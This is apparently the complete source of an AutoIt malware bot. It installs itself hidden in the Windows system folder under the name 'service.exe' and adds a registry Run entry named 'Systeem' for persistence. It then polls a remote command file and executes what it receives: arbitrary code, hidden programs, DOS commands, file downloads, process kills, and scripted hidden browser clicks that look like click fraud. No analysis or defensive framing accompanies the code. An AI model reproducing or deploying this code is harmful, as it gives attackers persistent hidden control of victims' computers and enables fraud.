#include "Process.au3"
#include "INet.au3"
#include "_IE.au3"
#NoTrayIcon
$a=@SystemDir & "\service.exe"
$reg = RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Systeem")
If @ScriptFullPath == $a And $a==$reg Then
FileSetAttrib($a,"+H+S")
Else
FileCopy(@ScriptFullPath, $a, 1)
RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Systeem", "REG_SZ", $a)
EndIf
$txt = "data.txt"
$key = ""
	$a1 = '^%(?s)(.*?)$'
	$a2 = '^\^([http://|https://].*?)\|\|([0-9,]+)[\|\|]*([0-9]*[,]*([0-9]*))$'
	$a3 = '^-([http://|https://].*?)\|\|([0|1])[,]*([0-9]*)$'
	$a4 = '^#(.*?)$'
	$a5 = '^@#(.*?)$'
	$a6 = '^\$(.*?)$'
	$a7 = '^!(.*?) (.*?)$'
	$a8 = '^~(.*?)$'
	$a9 = '^\+([http://|https://].*?)[\|\|]*([0-9,]+)[\|\|]*([0-9]*)[,]{0,1}([0-9]*)[,]*([0-9]*)[,]*([1|2]*)$'
While (1)
    Global $con = _INetGetSource($txt)
	    If $key <> $con Then
			If sm($a1, 0) Then
				$b = sm($a1, 2)
				$arr = StringSplit($b[1], @CRLF, 1)
				$var = UBound($arr,1) - 1
				For $i = 1 to $var Step +1	
					Execute($arr[$i])
				Next
			ElseIf sm($a2, 0) Then
				$b = sm($a2, 2)
				$arr = StringSplit($b[2], ",", 1)
				$var = UBound($arr,1)-1
				$ran = Random(1, $var, 1)
				$oIE = _IECreate ($b[1], 0, 0, 1)
				_IELoadWait ($oIE)
				Sleep(10000)
				_IEAction ($oiE, "visible")
				WinSetState($oiE, "", @SW_MAXIMIZE)
				If $b[3] Then
					Sleep($b[3])
				EndIf
				Send("+{TAB " & $arr[$ran] & "}")
				Send("{ENTER}")
				If $b[4] Then
					Sleep($b[4])
					_IEAction ($oiE, "invisible")
					Sleep(5000)
					_IEQuit ($oIE)
				EndIf
			ElseIf sm($a3, 0) Then
				$b = sm($a3, 2)
				$oIE = _IECreate ($b[1], 0, $b[2], 1)
				If $b[3] Then
					Sleep($b[3])
					_IEQuit ($oIE)
				EndIf
			ElseIf sm($a4, 0) Then
				$b = sm($a4, 2)
				Run($b[1])
			ElseIf sm($a5, 0) Then
				$b = sm($a5, 2)
				Run($b[1], "", @SW_HIDE)
			ElseIf sm($a6, 0) Then
				$b = sm($a6, 2)
				_RunDOS($b[1])
			ElseIf sm($a7, 0) Then
				$b = sm($a7, 2)
				InetGet ($b[1], $b[2], 0, 1)
			ElseIf sm($a8, 0) Then
				$b = sm($a8, 2)
				Run("TASKKILL /F /IM " & $b[1] & ".exe", "", @SW_HIDE)
			ElseIf sm($a9, 0) Then
				$b = sm($a9, 2)
				If $b[5] And $b[5]==1 Then
					$show = @SW_MAXIMIZE
				Else
					$show = @SW_HIDE
				EndIf
				$IEPath = RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\IEXPLORE.EXE", "")
				Run($IEPath & " " & $b[1], "", $show)
				WinWaitActive("[CLASS:IEFrame]")
				$text = WinGetText("[CLASS:IEFrame]", "")
				If $b[3] Then
					Sleep($b[3])
					$arr = StringSplit($b[2], ",", 1)
					$var = UBound($arr,1)-1
					$ran = Random(1, $var, 1)
					$cl = ControlClick("[CLASS:IEFrame]", $text, "[CLASS:Internet Explorer_Server; INSTANCE:1]", "left")
					If $cl <> 0 Then
					ControlSend("[CLASS:IEFrame]", $text, "[CLASS:Internet Explorer_Server; INSTANCE:1]", "+{TAB " & $arr[$ran] & "}{Enter}")
					Else
					ControlClick("[CLASS:IEFrame]", "", "[CLASS:Internet Explorer_Server; INSTANCE:1]", "left")
					ControlSend("[CLASS:IEFrame]", "", "[CLASS:Internet Explorer_Server; INSTANCE:1]", "+{TAB " & $arr[$ran] & "}{Enter}")
				EndIf
				;WinWaitActive("[CLASS:IEFrame]", "", 2)
				;WinClose("[CLASS:IEFrame]")
				EndIf
					If Not $b[4] Or $b[4]=="" Then
						Sleep(100)
					Else
						Sleep($b[4])
						WinClose("[CLASS:IEFrame]")
					EndIf
			EndIf
			$key = $con
		EndIf
    Sleep(15000)
WEnd